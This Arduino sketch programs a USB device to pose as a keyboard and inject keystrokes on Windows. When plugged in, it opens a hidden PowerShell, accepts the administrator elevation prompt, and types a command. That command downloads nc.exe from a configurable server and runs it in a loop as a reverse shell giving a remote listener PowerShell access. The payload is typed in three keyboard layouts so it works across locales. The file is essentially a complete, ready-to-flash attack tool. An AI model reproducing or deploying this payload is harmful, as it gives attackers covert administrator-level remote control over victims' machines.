#include<Keyboard.h>

const char server[] PROGMEM = "localhost";
const char downloadPort[] PROGMEM = "54414";
const char listenerPort[] PROGMEM = "47017";

//uncomment this line to use the 'printAll' function
//#define PRINTALL
//uncomment this line to define a custom built-in LED
//#define LED_BUILTIN 13

//below output was produced using 'Reverser.py' and the 'printAll' function
const char CMS[129]  PROGMEM = "##########\n##################### !>~$%&<()*+,-.`0123456789:;#=#^@ABCDEFGHIJKLMNOPQRSTUVWXYZ##[_#abcdefghijklmnopqrstuvwxyz#####";
const char US[129]   PROGMEM = "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
const char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->#0123456789:;\\=|^#ABCDEFGHIJKLMNOPQRSTUVWXYZ###{_'abcdefghijklmnopqrstuvwxyz#~##";

//modifier keys: https://www.arduino.cc/en/Reference/KeyboardModifiers
//modifier example: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardpress/

//note: 'smartPrint' has to be modified if the layouts used are modified
const unsigned int keyboardsLength = 3;
const char* const keyboards[keyboardsLength] = {CAFR, US, CMS};

//Win + R
const char STR0[] PROGMEM = "powershell -WindowStyle Hidden"; //"powershell"; //Ctrl + Shift + Enter
const char STR1[] PROGMEM = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://"; //[server]
const char STR2[] PROGMEM = ":"; //[downloadPort]
const char STR3[] PROGMEM = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \""; //[server]
const char STR4[] PROGMEM = "\",\""; //[listenerPort]
const char STR5[] PROGMEM = "\",\"-e\",\"powershell\";sleep 1}\n\n";

//smartPrint is a function made to support multiple keyboard layouts
void smartPrint(const char string[], int keyboard){
  for (int c = 0; pgm_read_byte_near(string + c) != '\0'; c++){
    char toPrint;
    if (pgm_read_byte_near(string + c) >= 128 || keyboard >= keyboardsLength) toPrint = '#';
    else toPrint = pgm_read_byte_near(keyboards[keyboard] + pgm_read_byte_near(string + c));

    //special cases, to be modified if the 'keyboards' array is modified
    //CMS
         if(pgm_read_byte_near(string + c) == '[' && keyboard == 2) printCtrlAlt('9'); // 9
    else if(pgm_read_byte_near(string + c) == ']' && keyboard == 2) printCtrlAlt('0'); // 0
    else if(pgm_read_byte_near(string + c) == '{' && keyboard == 2) printCtrlAlt('7'); // 7
    else if(pgm_read_byte_near(string + c) == '}' && keyboard == 2) printCtrlAlt('8'); // 8
    //CAFR
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at [ and ]
    else if(pgm_read_byte_near(string + c) == '[' && keyboard == 0) printCtrlAlt(47);     // ^
    else if(pgm_read_byte_near(string + c) == ']' && keyboard == 0) printCtrlAlt(48);     // ¸
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at { and }
    else if(pgm_read_byte_near(string + c) == '{' && keyboard == 0) printCtrlAlt(52);     // `
    else if(pgm_read_byte_near(string + c) == '}' && keyboard == 0) printCtrlAlt(49);     // <
    else Keyboard.print(toPrint);
  }
}
//a function to send Ctrl + Alt + key
template<typename T>
void printCtrlAlt(T key){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write(key);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_ALT);
}
//a function to send Ctrl + Shift + key
template<typename T>
void printCtrlShift(T key){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.write(key);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_SHIFT);
}


void setup(){
  Keyboard.begin();
#ifdef PRINTALL
  delay(1500);

  //print all characters to get the reversed keyboard array for a specific keyboard
  for (char c = 0; c < 32; c++) Keyboard.print('#');
  for (char c = 32; c < 128 - 1; c++) Keyboard.print(c);
#else
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  delay(1000);
  //Windows+R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(300);
  //run Powershell as administrator
  //for some reason we can still type in a hidden Powershell window...
  smartPrint(STR0, 0);
  printCtrlShift('\n');
  delay(500);
  Keyboard.write(KEY_LEFT_ARROW);
  Keyboard.write('\n');
  delay(500);
  //type in the payload
  for(int k = 0; k < keyboardsLength; k++){
    smartPrint(STR1, k);
    smartPrint(server, k);
    smartPrint(STR2, k);
    smartPrint(downloadPort, k);
    smartPrint(STR3, k);
    smartPrint(server, k);
    smartPrint(STR4, k);
    smartPrint(listenerPort, k);
    smartPrint(STR5, k);
    //blink the built-in LED to signal that a payload has been sent
    digitalWrite(LED_BUILTIN, HIGH);
    delay(50);
    digitalWrite(LED_BUILTIN, LOW);
  }
  
  //turn on the built-in LED to show that the operation completed successfully
  digitalWrite(LED_BUILTIN, HIGH);
#endif
}

void loop(){}
